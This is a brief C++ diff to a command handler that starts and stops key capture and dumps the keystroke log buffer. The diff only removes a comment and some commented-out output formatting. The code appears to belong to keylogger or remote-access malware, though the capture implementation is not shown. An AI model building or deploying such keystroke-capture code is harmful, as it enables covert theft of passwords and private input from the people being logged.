@@ -8,7 +8,7 @@ std::string KeyCommand::execute(const std::string& args) {
     std::cout << args << "\n";
     if (args == "start") {
         KeyControllerModule::start();
-        return "SUCCESS: Key capture started."; // Sửa lại thông báo để nhất quán
+        return "SUCCESS: Key capture started."; 
     }
 
     if (args == "stop") {
@@ -18,13 +18,6 @@ std::string KeyCommand::execute(const std::string& args) {
 
     if (args == "dump") {
         std::string keylog_data = KeyControllerModule::getBuffer();
-
-        /*if (!keylog_data.empty()) {
-            return "SUCCESS: Key log content:\n" + keylog_data;
-        }
-        else {
-            return "SUCCESS: Key log buffer is currently empty.";
-        }*/
         return keylog_data;
     }
 
